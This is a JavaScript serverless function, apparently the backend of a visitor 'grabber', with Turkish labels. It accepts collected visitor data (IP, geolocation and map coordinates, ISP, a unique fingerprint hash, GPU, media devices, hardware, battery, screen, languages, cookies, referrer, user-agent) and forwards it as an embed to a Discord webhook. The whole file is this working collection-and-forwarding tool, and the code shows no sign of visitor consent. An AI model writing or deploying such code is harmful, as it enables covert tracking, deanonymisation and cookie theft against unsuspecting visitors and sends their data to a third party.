exports.handler = async (event, context) => {
  let data = {};
  try {
    if (event.body) {
      data = JSON.parse(event.body);
    }
  } catch (e) {}

  const embed = {
    title: "📊 Detaylı Ziyaretçi & Donanım Raporu",
    color: 3447003,
    fields: [
      {
        name: "🌐 Ağ & Konum Bilgileri",
        value: 
          `**IP Adresi:** ${data.ip || 'Bilinmiyor'}\n` +
          `**Konum:** ${data.location || 'Bilinmiyor'}\n` +
          `**Zaman Dilimi:** ${data.timezone || 'Bilinmiyor'}\n` +
          `**İSS & ASN:** ${data.isp || 'Bilinmiyor'}\n` +
          `**Koordinatlar:** ${data.coords ? `[Haritada Gör](${data.coords})` : 'Bilinmiyor'}`
      },
      {
        name: "💻 Donanım, Medya & Parmak İzi",
        value: 
          `**Benzersiz Parmak İzi (Hash):** \`${data.fingerprint || 'Bilinmiyor'}\`\n` +
          `**Ekran Kartı (GPU):** ${data.gpu || 'Bilinmiyor'}\n` +
          `**Takılı Medya Cihazları:** ${data.media || 'Bilinmiyor'}\n` +
          `**İşletim Sistemi / Platform:** ${data.platform || 'Bilinmiyor'}\n` +
          `**Donanım (CPU / RAM):** ${data.hardware || 'Bilinmiyor'}\n` +
          `**Batarya:** ${data.battery || 'Bilinmiyor'}`
      },
      {
        name: "🖥️ Ekran & Dokunmatik",
        value: 
          `**Ekran:** ${data.screen || 'Bilinmiyor'}\n` +
          `**Pencere:** ${data.windowSize || 'Bilinmiyor'}\n` +
          `**Renk / Piksel:** ${data.colorDepth || 'Bilinmiyor'}\n` +
          `**Dokunmatik Ekran:** ${data.touch || 'Bilinmiyor'}`
      },
      {
        name: "🌐 Tarayıcı & Oturum Bilgileri",
        value: 
          `**Tarayıcı Dilleri:** ${data.languages || 'Bilinmiyor'}\n` +
          `**Çerezler:** ${data.cookies || 'Bilinmiyor'}\n` +
          `**Geldiği Yer (Referrer):** ${data.referrer || 'Doğrudan Giriş'}\n` +
          `**Ziyaret Edilen Sayfa:** ${data.url || 'Bilinmiyor'}\n` +
          `**User-Agent:** \`${event.headers['user-agent'] || 'Bilinmiyor'}\``
      }
    ],
    timestamp: new Date().toISOString()
  };

  const webhookUrl = process.env.DISCORD_WEBHOOK_URL;

  if (webhookUrl) {
    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    });
  }

  return {
    statusCode: 200,
    body: JSON.stringify({ status: "ok" })
  };
};